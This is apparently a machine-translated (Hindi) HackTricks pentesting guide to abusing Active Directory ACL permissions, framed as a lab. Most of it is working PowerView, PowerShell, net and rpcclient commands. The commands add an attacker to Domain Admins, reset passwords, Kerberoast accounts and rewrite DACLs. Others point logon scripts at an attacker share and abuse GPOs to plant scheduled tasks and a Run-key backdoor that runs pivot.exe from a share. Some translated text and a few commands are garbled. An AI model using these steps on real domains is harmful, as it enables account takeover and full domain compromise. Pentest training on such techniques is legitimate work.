# Active Directory ACLs/ACEs का दुरुपयोग करना

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें और** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके** अपना योगदान दें।

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

वे संदर्भ बिंदुओं को खोजें जो सबसे महत्वपूर्ण होते हैं ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमला सतह का पता लगाता है, प्रोएक्टिव धमकी स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, सभी मुद्दों को खोजता है। [**इसे मुफ्त में प्रयास करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## संदर्भ

यह लैब Active Directory Discretionary Access Control Lists (DACLs) और Acccess Control Entries (ACEs) की कमजोर अनुमतियों का दुरुपयोग करने के लिए है जो DACLs का हिस्सा बनाते हैं।

उपयोगकर्ता और समूहों जैसे Active Directory ऑब्जेक्ट सुरक्षित ऑब्जेक्ट होते हैं और DACL/ACEs यह निर्धारित करते हैं कि कौन उन ऑब्जेक्ट्स को पढ़ सकता है/संशोधित कर सकता है (उदाहरण के लिए खाता नाम बदलें, पासवर्ड रीसेट करें, आदि)।

"Domain Admins" सुरक्षित ऑब्जेक्ट के लिए ACEs का एक उदाहरण यहां देखा जा सकता है:

![](../../../.gitbook/assets/1.png)

हम अटैकर के रूप में हमें इनमें से कुछ Active Directory ऑब्जेक्ट अनुमतियों और प्रकारों में रुचि है:

* **GenericAll** - ऑब्जेक्ट के लिए पूरी अधिकार (उपयोगकर्ता को समूह में जोड़ें या उपयोगकर्ता का पासवर्ड रीसेट करें)
* **GenericWrite** - ऑब्जेक्ट के विशेषताओं को अपडेट करें (उदाहरण के लिए लॉगऑन स्क्रिप्ट)
* **WriteOwner** - ऑब्जेक्ट के मालिक को हमलावर नियंत्रित उपयोगकर्ता में बदलें और ऑब्जेक्ट को नियंत्रण में ले लें
* **WriteDACL** - ऑब्जेक्ट के ACEs को संशोधित करें और ऑब्जेक्ट पर पूर्ण नियंत्रण अधिकार दें
* **AllExtendedRights** - उपयोगकर्ता को समूह में जोड़ने या पासवर्ड रीसेट करने की क्षमता
* **ForceChangePassword** - उपयोगकर्ता का पासवर्ड बदलने की क्षमता
* **Self (Self-Membership)** - अपने आप को समूह में जोड़ने की क्षमता

इस लैब में, हम इनमें से अधिकांश ACEs का अन्वेषण करने और उन्हें शोधने का प्रयास करेंगे।

यह उपयोगी हो सकता है कि आप [BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) और Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) के सभी को अवगत कर लें क्योंकि आप कभी नहीं जानते कि आप एक अल्प प्रचलित अधिकार के दौरान एक मूल्यांकन के दौरान आपका सामना कब कर सकते हैं।

## उपयोगकर्ता पर GenericAll

powerview का उपयोग करके, आइए जांचें कि हमारे हमलावर उपयोगकर्ता `spotless` के पास `GenericAll rights` हैं या नहीं AD ऑब्जेक्ट के लिए उपयोगकर्ता `delegate` के लिए:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
हम देख सकते हैं कि वास्तव में हमारे उपयोगकर्ता `spotless` के पास `GenericAll` अधिकार हैं, जो हमलावर को खाता हासिल करने की क्षमता प्रदान करता है:

![](../../../.gitbook/assets/2.png)

*   **पासवर्ड बदलें**: आप बस उस उपयोगकर्ता का पासवर्ड बदल सकते हैं इसके लिए निम्नलिखित कमांड का उपयोग करें

```bash
net user <username> <password> /domain
```
*   **लक्षित Kerberoasting**: आप उपयोगकर्ता को **kerberoastable** बना सकते हैं और खाते पर **SPN** सेट करके इसे kerberoast करने और ऑफलाइन क्रैक करने का प्रयास कर सकते हैं:

```powershell
# SPN सेट करें
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
# हैश प्राप्त करें
.\Rubeus.exe kerberoast /user:<username> /nowrap
# SPN साफ़ करें
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

# आप यह भी उपयोग कर सकते हैं https://github.com/ShutdownRepo/targetedKerberoast
# एक या सभी उपयोगकर्ताओं के हैश प्राप्त करने के लिए
python3 targetedKerberoast.py -domain.local -u <username> -p password -v
```
*   **लक्षित ASREPRoasting**: आप उपयोगकर्ता को **ASREPRoastable** बना सकते हैं **पूर्व-प्रमाणीकरण** को **अक्षम** करके और फिर ASREProast कर सकते हैं।

```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

## समूह पर GenericAll

चलो देखते हैं कि `Domain admins` समूह के पास कोई कमजोर अनुमतियाँ हैं या नहीं। सबसे पहले, इसका `distinguishedName` प्राप्त करें:
```csharp
Get-NetGroup "domain admins" -FullData
```
![](../../../.gitbook/assets/4.png)
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
हम देख सकते हैं कि हमारे हमलावर उपयोगकर्ता `spotless` को फिर से `GenericAll` अधिकार है:

![](../../../.gitbook/assets/5.png)

इसके परिणामस्वरूप, हमें खुद को (उपयोगकर्ता `spotless`) `Domain Admin` समूह में जोड़ने की अनुमति मिलती है:
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

यही काम Active Directory या PowerSploit मॉड्यूल के साथ भी किया जा सकता है:
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Computer/User पर लिखें

* यदि आपके पास किसी **कंप्यूटर ऑब्जेक्ट** पर ये विशेषाधिकार हैं, तो आप [Kerberos **Resource-based Constrained Delegation**: Computer Object Take Over](../resource-based-constrained-delegation.md) का उपयोग कर सकते हैं।
* यदि आपके पास एक उपयोगकर्ता पर ये विशेषाधिकार हैं, तो आप इस पेज में [पहले विधि में से एक का उपयोग कर सकते हैं](./#genericall-on-user)।
* या फिर, आपके पास इसे कंप्यूटर या उपयोगकर्ता में होने पर आप **Shadow Credentials** का उपयोग कर सकते हैं:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## Group पर WriteProperty

यदि हमारे नियंत्रण में होने वाले उपयोगकर्ता के पास `Domain Admin` समूह के लिए `All` ऑब्जेक्ट्स पर `WriteProperty` अधिकार हैं:

![](../../../.gitbook/assets/7.png)

तो हम फिर से अपने आप को `Domain Admins` समूह में जोड़ सकते हैं और विशेषाधिकारों को बढ़ा सकते हैं:
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/8.png)

## स्वयं (स्वयं सदस्यता) समूह पर

एक और विशेषाधिकार जो हमलावर्ती को समूह में खुद को जोड़ने की अनुमति देता है:

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty (स्वयं सदस्यता)

एक और विशेषाधिकार जो हमलावर्ती को समूह में खुद को जोड़ने की अनुमति देता है:
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/11.png)
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

यदि हमारे पास `User-Force-Change-Password` ऑब्जेक्ट प्रकार पर `ExtendedRight` है, तो हम उपयोगकर्ता के मौजूदा पासवर्ड को नहीं जानते हुए उनका पासवर्ड रीसेट कर सकते हैं:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

पावरव्यू के साथ ऐसा ही करें:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

एक और तरीका जो पासवर्ड-सुरक्षित-स्ट्रिंग परिवर्तन के साथ खेलने की आवश्यकता नहीं है:
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
...या एक लाइनर अगर कोई इंटरैक्टिव सत्र उपलब्ध नहीं है:
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

और एक अंतिम तरीका है इसे लिनक्स से प्राप्त करने का:
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
अधिक जानकारी:

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## समूह पर WriteOwner

ध्यान दें कि हमले से पहले `Domain Admins` के मालिक `Domain Admins` है:

![](../../../.gitbook/assets/17.png)

ACE जाँच के बाद, यदि हमें पाता चलता है कि हमारे नियंत्रण में एक उपयोगकर्ता के पास `WriteOwner` अधिकार हैं `ObjectType:All` पर
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/18.png)

...हम `Domain Admins` ऑब्जेक्ट के मालिक को हमारे उपयोगकर्ता, जो हमारे मामले में `spotless` है, के रूप में बदल सकते हैं। ध्यान दें कि `-Identity` के साथ निर्दिष्ट किए गए SID `Domain Admins` समूह का SID है:
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## उपयोगकर्ता पर GenericWrite
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/20.png)

`ObjectType` पर `WriteProperty`, जो इस विशेष मामले में `Script-Path` है, हमें आक्रमक स्क्रिप्ट का पथ अधिलेखित करने की अनुमति देता है, जिसका मतलब है कि अगली बार जब उपयोगकर्ता `delegate` लॉग इन करेगा, उनकी सिस्टम हमारी दुष्ट स्क्रिप्ट को निष्पादित करेगी:
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
नीचे दिखाया गया है कि उपयोगकर्ता के ~~`delegate`~~ लॉगऑन स्क्रिप्ट फ़ील्ड AD में अपडेट हो गया है:

![](../../../.gitbook/assets/21.png)

## समूह पर GenericWrite

इससे आप नए उपयोगकर्ताओं को समूह के सदस्य के रूप में सेट कर सकते हैं (उदाहरण के लिए खुद को):
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

सबसे महत्वपूर्ण संकट ढूंढ़ें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धमकी स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, मुद्दों को खोजता है। [**इसे नि: शुल्क परीक्षण के लिए प्रयास करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज ही।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

यदि आप किसी समूह के मालिक हैं, जैसे मैं `Test` AD समूह का मालिक हूँ:

![](../../../.gitbook/assets/22.png)

जिसे आप बेशक पावरशेल के माध्यम से कर सकते हैं:
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![](../../../.gitbook/assets/23.png)

और आपके पास उस AD ऑब्जेक्ट पर `WriteDACL` है:

![](../../../.gitbook/assets/24.png)

...तो आप एक चुटकुले के साथ [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) विशेषाधिकार प्राप्त कर सकते हैं:
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
जिसका मतलब है कि अब आप पूर्णतः AD ऑब्जेक्ट को नियंत्रित करते हैं:

![](../../../.gitbook/assets/25.png)

इसका अर्थ है कि अब आप समूह में नए उपयोगकर्ता जोड़ सकते हैं।

दिलचस्प है कि मैं एक्टिव डिरेक्टरी मॉड्यूल और `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन अधिकारों का दुरुपयोग नहीं कर सका:
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **डोमेन पर प्रतिलिपि (DCSync)**

**DCSync** अनुमति में डोमेन पर इन अनुमतियों का होना शामिल है: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।\
[**डीसीसिंक हमले के बारे में और अधिक जानें।**](../dcsync.md)

## GPO अधिकार देना <a href="#gpo-delegation" id="gpo-delegation"></a>

कभी-कभी, कुछ उपयोगकर्ता/समूहों को समूह नीति वस्तुओं को प्रबंधित करने के लिए पहुंच दी जा सकती है जैसा कि `offense\spotless` उपयोगकर्ता के साथ हो रहा है:

![](../../../.gitbook/assets/a13.png)

हम PowerView का उपयोग करके इसे देख सकते हैं:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
नीचे दिए गए चित्र में दिखाया गया है कि उपयोगकर्ता `offense\spotless` के पास **WriteProperty**, **WriteDacl**, **WriteOwner** अधिकार हैं जो दुरुपयोग के लिए उपयुक्त हैं:

![](../../../.gitbook/assets/a14.png)

### GPO अनुमतियों की जांच करें <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

हम ऊपर दिए गए स्क्रीनशॉट से जानते हैं कि ऊपर दिए गए ObjectDN `New Group Policy Object` GPO को संदर्भित कर रहा है क्योंकि ObjectDN `CN=Policies` को और भी दिखाता है और यही वही है जो GPO सेटिंग्स में हाइलाइट किया गया है:

![](../../../.gitbook/assets/a15.png)

यदि हम विशेष रूप से गलत रूप से कॉन्फ़िगर किए गए GPOs की खोज करना चाहते हैं, तो हम PowerSploit से कई cmdlets को चेन कर सकते हैं जैसे:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**नियम लागू किए गए निर्दिष्ट नीति वाले कंप्यूटर**

अब हम निर्दिष्ट नीति `Misconfigured Policy` को लागू किए गए कंप्यूटरों के नामों को समाधान कर सकते हैं:
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**दिए गए कंप्यूटर पर लागू नीतियाँ**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**दिए गए नीति के साथ ओयूजी**
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **गलत उपयोग GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

इस गलत विन्यास का दुरुपयोग करने और कोड निष्पादन प्राप्त करने के एक तरीके में, निम्नलिखित रूप में GPO के माध्यम से तत्काल निर्धारित कार्य का निर्माण करना है:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

ऊपर दिए गए कोड के द्वारा हमारे उपयोगकर्ता spotless को संक्रमित बॉक्स के स्थानीय `administrators` समूह में जोड़ा जाएगा। ध्यान दें कि कोड के निष्पादन से पहले समूह में उपयोगकर्ता `spotless` मौजूद नहीं है:

![](../../../.gitbook/assets/a20.png)

### GroupPolicy मॉड्यूल **- GPO का दुरुपयोग**

{% hint style="info" %}
आप `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands` के साथ जांच सकते हैं कि GroupPolicy मॉड्यूल स्थापित है या नहीं। यदि आपको जरूरत पड़े तो आप इसे स्थानीय व्यवस्थापक के रूप में `Install-WindowsFeature –Name GPMC` के साथ स्थापित कर सकते हैं।
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
इस पेलोड के बाद, GPO को अपडेट करने के बाद, कंप्यूटर में किसी को लॉगिन करने की भी आवश्यकता होगी।

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- GPO का दुरुपयोग**

{% hint style="info" %}
यह GPO नहीं बना सकता, इसलिए हमें अभी भी RSAT के साथ उसे बनाना होगा या हमें पहले से ही लिखने की अनुमति है उसे संशोधित करनी होगी।
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### नीति अद्यतन को बलवान बनाएं <a href="#force-policy-update" id="force-policy-update"></a>

पिछले अपमानजनक **GPO अद्यतन** लगभग हर 90 मिनट में पुनः लोड होते हैं।\
यदि आपके पास कंप्यूटर तक पहुंच है, तो आप `gpupdate /force` के साथ इसे बलवान बना सकते हैं।

### अंदर की ओर <a href="#under-the-hood" id="under-the-hood"></a>

यदि हम `Misconfigured Policy` GPO के निर्धारित कार्यों को देखें, तो हम वहां हमारा `evilTask` बैठा हुआ देख सकते हैं:

![](../../../.gitbook/assets/a22.png)

नीचे दिए गए XML फ़ाइल में हमारा दुष्ट निर्धारित कार्य दिखाई देता है, जो GPO में है:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### उपयोगकर्ता और समूह <a href="#users-and-groups" id="users-and-groups"></a>

यही विशेषाधिकार उन्नयन गोपनीयता नीति (GPO) उपयोगकर्ता और समूह सुविधा का दुरुपयोग करके प्राप्त किया जा सकता है। नीचे दिए गए फ़ाइल में ध्यान दें, जहां पंक्ति 6 में उपयोगकर्ता `spotless` को स्थानीय `administrators` समूह में जोड़ा जाता है - हम उपयोगकर्ता को कुछ और में बदल सकते हैं, एक और उपयोगकर्ता जोड़ सकते हैं या यहां तक कि हम उपयोगकर्ता को दूसरे समूह / कई समूहों में जोड़ सकते हैं क्योंकि हम GPO विनियामक फ़ाइल को दिखाए गए स्थान में संशोधित कर सकते हैं जो हमारे उपयोगकर्ता `spotless` को सौंपा गया है:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
{% endcode %}

इसके अलावा, हम लॉगऑन/लॉगऑफ स्क्रिप्ट का उपयोग करने, ऑटोरन के लिए रजिस्ट्री का उपयोग करने, .msi को स्थापित करने, सेवाओं को संपादित करने और इसी तरह के कोड निष्पादन मार्गों का विचार कर सकते हैं।

## संदर्भ

* प्राथमिक रूप से, यह जानकारी अधिकांश रूप से [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) से कॉपी की गई थी।
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

वे संवेदनशीलता के विषय में विशेष रूप से महत्वपूर्ण दुर्बलताओं का पता लगाएं ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपके हमले के सतह का पता लगाता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, सभी मुद्दों को खोजता है। [**इसे मुफ्त में आज़माएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की अनुमति चाहिए? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
